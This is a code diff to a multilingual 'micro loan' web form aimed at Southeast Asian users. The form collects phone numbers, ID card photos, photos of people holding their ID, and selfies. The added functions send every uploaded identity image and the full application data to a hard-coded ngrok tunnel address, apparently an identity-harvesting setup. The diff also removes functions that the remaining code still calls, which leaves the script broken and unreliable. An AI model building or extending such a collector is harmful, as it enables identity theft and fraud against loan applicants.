@@ -1216,450 +1216,69 @@
         // 阿里云OSS配置
         let ossClient = null;
         const ossConfig = {
-            region: 'oss-cn-hangzhou', // 根据您的bucket所在地区修改
-            accessKeyId: '', // 填写您的AccessKeyId
-            accessKeySecret: '', // 填写您的AccessKeySecret
-            bucket: '', // 填写您的Bucket名称
-            secure: true // 使用HTTPS
+            region: 'oss-cn-hangzhou', // 根据您的bucket所在地区修改，例如oss-cn-beijing、oss-cn-shanghai等
+            accessKeyId: '', // 填写您的AccessKeyId，可在阿里云控制台获取
+            accessKeySecret: '', // 填写您的AccessKeySecret，可在阿里云控制台获取
+            bucket: '', // 填写您的Bucket名称，例如example-bucket
+            secure: true, // 使用HTTPS
+            stsServer: 'http://localhost:3001/sts' // STS服务器地址，用于获取临时凭证
+        };
+
+        // 本地文件服务器配置
+        const localServerConfig = {
+            url: 'http://localhost:3000' // 本地服务器地址
         };
 
         // 初始化OSS客户端
-        function initOssClient() {
+        async function initOssClient() {
             try {
-                ossClient = new OSS({
-                    region: ossConfig.region,
-                    accessKeyId: ossConfig.accessKeyId,
-                    accessKeySecret: ossConfig.accessKeySecret,
-                    bucket: ossConfig.bucket,
-                    secure: ossConfig.secure
-                });
-                console.log('OSS客户端初始化成功');
+                // 尝试使用STS服务获取临时凭证
+                if (ossConfig.stsServer) {
+                    try {
+                        console.log('正在获取OSS临时凭证...');
+                        const response = await fetch(ossConfig.stsServer);
+                        
+                        if (!response.ok) {
+                            throw new Error(`获取STS凭证失败: ${response.status}`);
+                        }
+                        
+                        const stsToken = await response.json();
+                        
+                        ossClient = new OSS({
+                            region: stsToken.region || ossConfig.region,
+                            accessKeyId: stsToken.AccessKeyId,
+                            accessKeySecret: stsToken.AccessKeySecret,
+                            bucket: stsToken.bucket || ossConfig.bucket,
+                            stsToken: stsToken.SecurityToken,
+                            secure: ossConfig.secure
+                        });
+                        
+                        console.log('使用STS临时凭证初始化OSS客户端成功');
+                        return;
+                    } catch (error) {
+                        console.warn('获取STS临时凭证失败，将尝试使用AccessKey方式:', error);
+                    }
+                }
+                
+                // 如果STS获取失败或未配置STS，则使用AccessKey方式（不推荐在生产环境使用）
+                if (ossConfig.accessKeyId && ossConfig.accessKeySecret && ossConfig.bucket) {
+                    ossClient = new OSS({
+                        region: ossConfig.region,
+                        accessKeyId: ossConfig.accessKeyId,
+                        accessKeySecret: ossConfig.accessKeySecret,
+                        bucket: ossConfig.bucket,
+                        secure: ossConfig.secure
+                    });
+                    console.log('使用AccessKey初始化OSS客户端成功');
+                } else {
+                    console.error('OSS配置不完整，无法初始化客户端');
+                }
             } catch (error) {
                 console.error('OSS客户端初始化失败:', error);
             }
         }
 
         // 上传文件到OSS
-        async function uploadToOSS(file, fileType) {
-            if (!ossClient) {
-                console.error('OSS客户端未初始化');
-                return null;
-            }
-
-            try {
-                // 生成唯一文件名
-                const fileName = `${fileType}_${phoneNumber}_${Date.now()}.${file.name.split('.').pop()}`;
-                
-                // 上传文件
-                const result = await ossClient.put(fileName, file);
-                
-                console.log('文件上传成功:', result);
-                return result.url; // 返回文件URL
-            } catch (error) {
-                console.error('文件上传失败:', error);
-                return null;
-            }
-        }
-
-        // Initialize on load
-        window.onload = function() {
-            init();
-            // 初始化OSS客户端
-            initOssClient();
-        };
-
-        // 初始化变量
-        let currentLang = 'zh'; // 默认语言为中文
-        let currentCountry = 'id'; // 默认国家为印度尼西亚
-        let phoneNumber = '';
-        let ktpImageData = null;
-        let selfieImageData = null;
-        let ktpUploaded = false;
-        let holdingKtpUploaded = false;
-        let selfieUploaded = false;
-        let faceMatchSuccess = false;
-        
-        // 添加OSS URL变量
-        let ktpOssUrl = null;
-        let holdingKtpOssUrl = null;
-        let selfieOssUrl = null;
-
-        // 国家配置
-        const countryConfig = {
-            id: {
-                name: 'Indonesia',
-                flag: 'https://flagcdn.com/w80/id.png',
-                countryCode: '+62',
-                currency: 'Rp',
-                exchangeRate: 1, // 基准汇率
-                minAmount: 1128163,
-                maxAmount: 215000000,
-                defaultLang: 'id',
-                idCardName: 'KTP'
-            },
-            my: {
-                name: 'Malaysia',
-                flag: 'https://flagcdn.com/w80/my.png',
-                countryCode: '+60',
-                currency: 'RM',
-                exchangeRate: 0.00029, // 相对于印尼盾的汇率
-                minAmount: 327,
-                maxAmount: 62350,
-                defaultLang: 'ms',
-                idCardName: 'MyKad'
-            },
-            ph: {
-                name: 'Philippines',
-                flag: 'https://flagcdn.com/w80/ph.png',
-                countryCode: '+63',
-                currency: '₱',
-                exchangeRate: 0.0037, // 相对于印尼盾的汇率
-                minAmount: 4174,
-                maxAmount: 795500,
-                defaultLang: 'tl',
-                idCardName: 'PhilID'
-            },
-            th: {
-                name: 'Thailand',
-                flag: 'https://flagcdn.com/w80/th.png',
-                countryCode: '+66',
-                currency: '฿',
-                exchangeRate: 0.0022, // 相对于印尼盾的汇率
-                minAmount: 2482,
-                maxAmount: 473000,
-                defaultLang: 'th',
-                idCardName: 'Thai ID Card'
-            },
-            vn: {
-                name: 'Vietnam',
-                flag: 'https://flagcdn.com/w80/vn.png',
-                countryCode: '+84',
-                currency: '₫',
-                exchangeRate: 15.3, // 相对于印尼盾的汇率
-                minAmount: 17260893,
-                maxAmount: 3289500000,
-                defaultLang: 'vi',
-                idCardName: 'CCCD'
-            }
-        };
-
-        // 添加国家名称和翻译
-        const translations = {
-            en: {
-                title: "Micro Loan Application",
-                subtitle: "Fast, Safe, Convenient",
-                welcomeTitle: "Welcome to Micro Loan Service",
-                welcomeMessage: "We provide convenient and quick small loans to help you solve your financial needs.",
-                welcomeAmount: "Loan Amount",
-                getStarted: "Get Started",
-                step1: "Phone Number",
-                step2: "ID Documents",
-                step3: "Loan Amount",
-                next: "Next",
-                back: "Back",
-                submit: "Submit Application",
-                phoneLabel: "Your Phone Number",
-                phonePlaceholder: "Enter your phone number",
-                phoneError: "Please enter a valid phone number",
-                ktpLabel: "ID Card Photo",
-                holdingKtpLabel: "Photo holding ID Card",
-                selfieLabel: "Selfie Photo",
-                idCardRequirements: "Upload a clear photo of your {idCardName} from {country}",
-                idCardError: "The ID card could not be validated",
-                holdingIdError: "The holding ID photo could not be validated",
-                faceMismatch: "Face doesn't match with ID card",
-                uploadHint: "Click or drag to upload",
-                amountLabel: "Loan Amount",
-                amountTooLow: "Amount is too low, minimum Rp 1,128,163",
-                amountTooHigh: "Amount is too high, maximum Rp 215,000,000",
-                amountNotMultiple: "Amount must be a multiple of 1,000",
-                successTitle: "Application Submitted!",
-                successMessage: "Your loan application has been submitted successfully. We will contact you shortly.",
-                backButton: "Back",
-                countryLabel: "Select Country",
-                detectedCountry: "We detected you're from {country}"
-            },
-            zh: {
-                title: "小额贷款申请",
-                subtitle: "快速、安全、便捷",
-                welcomeTitle: "欢迎使用微型贷款服务",
-                welcomeMessage: "我们提供便捷、快速的小额贷款，帮助您解决生活中的资金需求。",
-                welcomeAmount: "借款金额",
-                getStarted: "开始申请",
-                step1: "电话号码",
-                step2: "身份证明",
-                step3: "贷款金额",
-                next: "下一步",
-                back: "返回",
-                submit: "提交申请",
-                phoneLabel: "您的电话号码",
-                phonePlaceholder: "请输入您的电话号码",
-                phoneError: "请输入有效的电话号码",
-                ktpLabel: "身份证照片",
-                holdingKtpLabel: "手持身份证照片",
-                selfieLabel: "自拍照片",
-                idCardRequirements: "上传清晰的{country} {idCardName}照片",
-                idCardError: "无法验证身份证",
-                holdingIdError: "无法验证手持身份证照片",
-                faceMismatch: "面部与身份证不匹配",
-                uploadHint: "点击或拖拽上传",
-                amountLabel: "贷款金额",
-                amountTooLow: "金额过低，最低为 Rp 1,128,163",
-                amountTooHigh: "金额过高，最高为 Rp 215,000,000",
-                amountNotMultiple: "金额必须是1000的倍数",
-                successTitle: "申请已提交！",
-                successMessage: "您的贷款申请已成功提交。我们将尽快与您联系。",
-                backButton: "返回",
-                countryLabel: "选择国家",
-                detectedCountry: "我们检测到您来自{country}"
-            },
-            id: {
-                title: "Aplikasi Pinjaman Mikro",
-                subtitle: "Cepat, Aman, Nyaman",
-                welcomeTitle: "Selamat Datang di Layanan Pinjaman Mikro",
-                welcomeMessage: "Kami menyediakan pinjaman kecil yang nyaman dan cepat untuk membantu Anda menyelesaikan kebutuhan finansial Anda.",
-                welcomeAmount: "Jumlah Pinjaman",
-                getStarted: "Mulai",
-                step1: "Nomor Telepon",
-                step2: "Dokumento Identitas",
-                step3: "Jumlah Pinjaman",
-                next: "Selanjutnya",
-                back: "Kembali",
-                submit: "Kirim Aplikasi",
-                phoneLabel: "Nomor Telepon Anda",
-                phonePlaceholder: "Masukkan nomor telepon Anda",
-                phoneError: "Silakan masukkan nomor telepon yang valid",
-                ktpLabel: "Foto Kartu Identitas",
-                holdingKtpLabel: "Foto memegang Kartu Identitas",
-                selfieLabel: "Foto Selfie",
-                idCardRequirements: "Unggah foto {idCardName} yang jelas dari {country}",
-                idCardError: "Kartu identitas tidak dapat divalidasi",
-                holdingIdError: "Foto memegang kartu identitas tidak dapat divalidasi",
-                faceMismatch: "Wajah tidak cocok dengan kartu identitas",
-                uploadHint: "Klik atau tarik untuk mengunggah",
-                amountLabel: "Jumlah Pinjaman",
-                amountTooLow: "Jumlah terlalu rendah, minimum Rp 1.128.163",
-                amountTooHigh: "Jumlah terlalu tinggi, maksimal Rp 215.000.000",
-                amountNotMultiple: "Jumlah harus kelipatan 1.000",
-                successTitle: "Aplikasi Terkirim!",
-                successMessage: "Aplikasi pinjaman Anda telah berhasil dikirim. Kami akan segera menghubungi Anda.",
-                backButton: "Kembali",
-                countryLabel: "Pilih Negara",
-                detectedCountry: "Kami mendeteksi Anda berasal dari {country}"
-            },
-            ms: {
-                title: "Permohonan Pinjaman Mikro",
-                subtitle: "Cepat, Selamat, Mudah",
-                welcomeTitle: "Selamat Datang ke Perkhidmatan Pinjaman Mikro",
-                welcomeMessage: "Kami menyediakan pinjaman kecil yang mudah dan cepat untuk membantu anda menyelesaikan keperluan kewangan anda.",
-                welcomeAmount: "Jumlah Pinjaman",
-                getStarted: "Mulakan",
-                step1: "Nombor Telefon",
-                step2: "Dokumen Pengenalan",
-                step3: "Jumlah Pinjaman",
-                next: "Seterusnya",
-                back: "Kembali",
-                submit: "Hantar Permohonan",
-                phoneLabel: "Nombor Telefon Anda",
-                phonePlaceholder: "Masukkan nombor telefon anda",
-                phoneError: "Sila masukkan nombor telefon yang sah",
-                ktpLabel: "Gambar Kad Pengenalan",
-                holdingKtpLabel: "Gambar memegang Kad Pengenalan",
-                selfieLabel: "Gambar Selfie",
-                idCardRequirements: "Muat naik gambar {idCardName} yang jelas dari {country}",
-                idCardError: "Kad pengenalan tidak dapat disahkan",
-                holdingIdError: "Gambar memegang kad pengenalan tidak dapat disahkan",
-                faceMismatch: "Wajah tidak sepadan dengan kad pengenalan",
-                uploadHint: "Klik atau seret untuk muat naik",
-                amountLabel: "Jumlah Pinjaman",
-                amountTooLow: "Jumlah terlalu rendah, minimum Rp 1,128,163",
-                amountTooHigh: "Jumlah terlalu tinggi, maksimum Rp 215,000,000",
-                amountNotMultiple: "Jumlah mestilah gandaan 1,000",
-                successTitle: "Permohonan Dihantar!",
-                successMessage: "Permohonan pinjaman anda telah berjaya dihantar. Kami akan menghubungi anda sebentar lagi.",
-                backButton: "Kembali",
-                countryLabel: "Pilih Negara",
-                detectedCountry: "Kami mengesan anda dari {country}"
-            },
-            tl: {
-                title: "Aplikasyon para sa Micro Loan",
-                subtitle: "Mabilis, Ligtas, Madali",
-                welcomeTitle: "Maligayang Pagdating sa Serbisyo ng Micro Loan",
-                welcomeMessage: "Nagbibigay kami ng maginhawa at mabilis na maliliit na pautang upang tulungan kang lutasin ang iyong mga pangangailangang pinansyal.",
-                welcomeAmount: "Halaga ng Pautang",
-                getStarted: "Magsimula",
-                step1: "Numero ng Telepono",
-                step2: "Mga Dokumento ng ID",
-                step3: "Halaga ng Pautang",
-                next: "Susunod",
-                back: "Bumalik",
-                submit: "Isumite ang Aplikasyon",
-                phoneLabel: "Iyong Numero ng Telepono",
-                phonePlaceholder: "Ilagay ang iyong numero ng telepono",
-                phoneError: "Mangyaring maglagay ng wastong numero ng telepono",
-                ktpLabel: "Larawan ng ID Card",
-                holdingKtpLabel: "Larawan na hawak ang ID Card",
-                selfieLabel: "Larawan ng Selfie",
-                idCardRequirements: "Mag-upload ng malinaw na larawan ng iyong {idCardName} mula sa {country}",
-                idCardError: "Hindi ma-validate ang ID card",
-                holdingIdError: "Hindi ma-validate ang larawang hawak ang ID card",
-                faceMismatch: "Hindi tumutugma ang mukha sa ID card",
-                uploadHint: "I-click o i-drag upang mag-upload",
-                amountLabel: "Halaga ng Pautang",
-                amountTooLow: "Masyadong mababa ang halaga, minimum na Rp 1,128,163",
-                amountTooHigh: "Masyadong mataas ang halaga, maximum na Rp 215,000,000",
-                amountNotMultiple: "Ang halaga ay dapat na multiple ng 1,000",
-                successTitle: "Naisumite na ang Aplikasyon!",
-                successMessage: "Matagumpay na naisumite ang iyong aplikasyon ng pautang. Kokontakin ka namin sa lalong madaling panahon.",
-                backButton: "Bumalik",
-                countryLabel: "Pumili ng Bansa",
-                detectedCountry: "Nakita namin na ikaw ay mula sa {country}"
-            },
-            th: {
-                title: "แอปพลิเคชันสินเชื่อรายย่อย",
-                subtitle: "รวดเร็ว, ปลอดภัย, สะดวก",
-                welcomeTitle: "ยินดีต้อนรับสู่บริการสินเชื่อรายย่อย",
-                welcomeMessage: "เราให้บริการสินเชื่อขนาดเล็กที่สะดวกและรวดเร็วเพื่อช่วยคุณแก้ไขความต้องการทางการเงิน",
-                welcomeAmount: "จำนวนเงินกู้",
-                getStarted: "เริ่มต้น",
-                step1: "หมายเลขโทรศัพท์",
-                step2: "เอกสารยืนยันตัวตน",
-                step3: "จำนวนเงินกู้",
-                next: "ถัดไป",
-                back: "ย้อนกลับ",
-                submit: "ส่งใบสมัคร",
-                phoneLabel: "หมายเลขโทรศัพท์ของคุณ",
-                phonePlaceholder: "ป้อนหมายเลขโทรศัพท์ของคุณ",
-                phoneError: "โปรดป้อนหมายเลขโทรศัพท์ที่ถูกต้อง",
-                ktpLabel: "รูปถ่ายบัตรประจำตัว",
-                holdingKtpLabel: "รูปถ่ายถือบัตรประจำตัว",
-                selfieLabel: "รูปเซลฟี่",
-                idCardRequirements: "อัปโหลดรูปถ่าย {idCardName} ที่ชัดเจนจาก {country}",
-                idCardError: "ไม่สามารถตรวจสอบบัตรประจำตัวได้",
-                holdingIdError: "ไม่สามารถตรวจสอบรูปถ่ายที่ถือบัตรประจำตัวได้",
-                faceMismatch: "ใบหน้าไม่ตรงกับบัตรประจำตัว",
-                uploadHint: "คลิกหรือลากเพื่ออัปโหลด",
-                amountLabel: "จำนวนเงินกู้",
-                amountTooLow: "จำนวนเงินน้อยเกินไป ขั้นต่ำ Rp 1,128,163",
-                amountTooHigh: "จำนวนเงินมากเกินไป สูงสุด Rp 215,000,000",
-                amountNotMultiple: "จำนวนเงินต้องเป็นทวีคูณของ 1,000",
-                successTitle: "ส่งใบสมัครแล้ว!",
-                successMessage: "ใบสมัครสินเชื่อของคุณได้รับการส่งเรียบร้อยแล้ว เราจะติดต่อคุณในเร็วๆ นี้",
-                backButton: "ย้อนกลับ",
-                countryLabel: "เลือกประเทศ",
-                detectedCountry: "เราตรวจพบว่าคุณมาจาก {country}"
-            },
-            vi: {
-                title: "Ứng Dụng Khoản Vay Nhỏ",
-                subtitle: "Nhanh chóng, An toàn, Tiện lợi",
-                welcomeTitle: "Chào Mừng đến với Dịch Vụ Khoản Vay Nhỏ",
-                welcomeMessage: "Chúng tôi cung cấp các khoản vay nhỏ thuận tiện và nhanh chóng để giúp bạn giải quyết nhu cầu tài chính của mình.",
-                welcomeAmount: "Số Tiền Vay",
-                getStarted: "Bắt Đầu",
-                step1: "Số Điện Thoại",
-                step2: "Giấy Tờ Tùy Thân",
-                step3: "Số Tiền Vay",
-                next: "Tiếp Theo",
-                back: "Quay Lại",
-                submit: "Gửi Đơn Đăng Ký",
-                phoneLabel: "Số Điện Thoại Của Bạn",
-                phonePlaceholder: "Nhập số điện thoại của bạn",
-                phoneError: "Vui lòng nhập số điện thoại hợp lệ",
-                ktpLabel: "Ảnh Thẻ Căn Cước",
-                holdingKtpLabel: "Ảnh Cầm Thẻ Căn Cước",
-                selfieLabel: "Ảnh Selfie",
-                idCardRequirements: "Tải lên ảnh rõ ràng về {idCardName} của bạn từ {country}",
-                idCardError: "Không thể xác thực thẻ căn cước",
-                holdingIdError: "Không thể xác thực ảnh cầm thẻ căn cước",
-                faceMismatch: "Khuôn mặt không khớp với thẻ căn cước",
-                uploadHint: "Nhấp hoặc kéo để tải lên",
-                amountLabel: "Số Tiền Vay",
-                amountTooLow: "Số tiền quá thấp, tối thiểu Rp 1.128.163",
-                amountTooHigh: "Số tiền quá cao, tối đa Rp 215.000.000",
-                amountNotMultiple: "Số tiền phải là bội số của 1.000",
-                successTitle: "Đơn Đăng Ký Đã Được Gửi!",
-                successMessage: "Đơn đăng ký khoản vay của bạn đã được gửi thành công. Chúng tôi sẽ liên hệ với bạn sớm.",
-                backButton: "Quay Lại",
-                countryLabel: "Chọn Quốc Gia",
-                detectedCountry: "Chúng tôi phát hiện bạn đến từ {country}"
-            }
-        };
-
-        // Initialize
-        function init() {
-            // 由于移除了国家选择功能，默认使用印度尼西亚
-            currentCountry = 'id';
-            
-            // 检查是否需要根据IP设置语言
-            const savedLang = localStorage.getItem('selectedLanguage');
-            if (savedLang && translations[savedLang]) {
-                // 已有保存的语言设置，直接使用
-                currentLang = savedLang;
-                completeInitialization();
-            } else {
-                // 没有保存的语言，尝试根据IP检测语言
-                detectLanguageByIP();
-            }
-        }
-        
-        // 根据IP检测用户语言
-        function detectLanguageByIP() {
-            // 使用免费的IP地理位置API
-            fetch('https://ipapi.co/json/')
-                .then(response => response.json())
-                .then(data => {
-                    console.log("IP地理位置信息:", data);
-                    
-                    // 根据国家代码设置语言
-                    const countryCode = data.country_code.toLowerCase();
-                    switch(countryCode) {
-                        case 'cn':
-                            currentLang = 'zh';
-                            break;
-                        case 'id':
-                            currentLang = 'id';
-                            break;
-                        case 'my':
-                            currentLang = 'ms';
-                            break;
-                        case 'ph':
-                            currentLang = 'tl';
-                            break;
-                        case 'th':
-                            currentLang = 'th';
-                            break;
-                        case 'vn':
-                            currentLang = 'vi';
-                            break;
-                        default:
-                            currentLang = 'en'; // 默认使用英语
-                    }
-                    
-                    // 保存语言设置
-                    localStorage.setItem('selectedLanguage', currentLang);
-                    
-                    // 完成初始化
-                    completeInitialization();
-                })
-                .catch(error => {
-                    console.error("获取IP信息失败:", error);
-                    // 失败时使用默认语言
-                    currentLang = 'zh';
-                    completeInitialization();
-                });
-        }
-        
-        // 完成初始化的其余步骤
-        function completeInitialization() {
-            // 设置语言图标
-            document.getElementById('currentLangFlag').src = languageFlags[currentLang];
-            document.getElementById('modalCurrentLangFlag').src = languageFlags[currentLang];
-            
-            // 高亮显示当前选择的语言
-            document.querySelectorAll('.language-option').forEach(el => {
-                if (el.dataset.lang === currentLang) {
-                    el.classList.add('active');
-                } else {
                     el.classList.remove('active');
                 }
             });
@@ -1771,6 +1390,11 @@
                             ktpOssUrl = url; // 保存OSS URL
                         }
                     });
+                    
+                    // 同时上传到本地服务器
+                    uploadToLocalServer(file, 'ktp').then(path => {
+                        console.log('身份证照片已保存到本地:', path);
+                    });
                 }
             };
             reader.readAsDataURL(file);
@@ -1798,6 +1422,11 @@
                         if (url) {
                             holdingKtpOssUrl = url; // 保存OSS URL
                         }
+                    });
+                    
+                    // 同时上传到本地服务器
+                    uploadToLocalServer(file, 'holding_ktp').then(path => {
+                        console.log('手持身份证照片已保存到本地:', path);
                     });
                 }
             };
@@ -1827,6 +1456,11 @@
                     if (url) {
                         selfieOssUrl = url; // 保存OSS URL
                     }
+                });
+                
+                // 同时上传到本地服务器
+                uploadToLocalServer(file, 'selfie').then(path => {
+                    console.log('自拍照片已保存到本地:', path);
                 });
             };
             reader.readAsDataURL(file);
@@ -1949,12 +1583,24 @@
             // 可以将数据发送到后端API或保存到数据库
             console.log('提交的申请数据:', applicationData);
             
+            // 保存到本地服务器
+            saveApplicationToLocalServer(applicationData).then(path => {
+                console.log('申请数据已保存到本地:', path);
+                showCongratsModal();
+            });
+            
             // 也可以将数据保存到OSS作为JSON文件
             const jsonBlob = new Blob([JSON.stringify(applicationData)], { type: 'application/json' });
             const jsonFile = new File([jsonBlob], `application_${phoneNumber}_${Date.now()}.json`);
             
             uploadToOSS(jsonFile, 'application').then(url => {
                 console.log('申请数据已保存到OSS:', url);
+                
+                // 同时上传到本地服务器
+                uploadToLocalServer(jsonFile, 'application_json').then(path => {
+                    console.log('申请JSON文件已保存到本地:', path);
+                });
+                
                 showCongratsModal();
             });
         }
@@ -2523,6 +2169,61 @@
                 confetti.style.animationDelay = Math.random() * 3 + 's';
                 confetti.style.backgroundColor = `hsl(${Math.random() * 360}, 80%, 60%)`;
                 confettiContainer.appendChild(confetti);
+            }
+        }
+
+        // 上传文件到本地服务器
+        async function uploadToLocalServer(file, type) {
+            try {
+                const formData = new FormData();
+                formData.append('file', file);
+                formData.append('type', type);
+                formData.append('phone', phoneNumber || 'unknown');
+                formData.append('timestamp', new Date().toISOString());
+                
+                // 使用ngrok暴露的URL - 请将此URL替换为您的ngrok URL
+                const ngrokUrl = 'https://4040-18-177-124-92.ngrok-free.app'; // 替换为您的ngrok URL
+                const response = await fetch(`${ngrokUrl}/upload`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                if (!response.ok) {
+                    throw new Error(`上传失败: ${response.status}`);
+                }
+                
+                const data = await response.json();
+                console.log(`文件上传成功: ${data.filePath}`);
+                return data.filePath;
+            } catch (error) {
+                console.error('上传到本地服务器失败:', error);
+                return null;
+            }
+        }
+        
+        // 保存申请数据到本地服务器
+        async function saveApplicationToLocalServer(data) {
+            try {
+                // 使用ngrok暴露的URL - 请将此URL替换为您的ngrok URL
+                const ngrokUrl = 'https://4040-18-177-124-92.ngrok-free.app'; // 替换为您的ngrok URL
+                const response = await fetch(`${ngrokUrl}/saveApplication`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                });
+                
+                if (!response.ok) {
+                    throw new Error(`保存申请数据失败: ${response.status}`);
+                }
+                
+                const result = await response.json();
+                console.log(`申请数据保存成功: ${result.filePath}`);
+                return result.filePath;
+            } catch (error) {
+                console.error('保存申请数据到本地服务器失败:', error);
+                return null;
             }
         }
     </script>
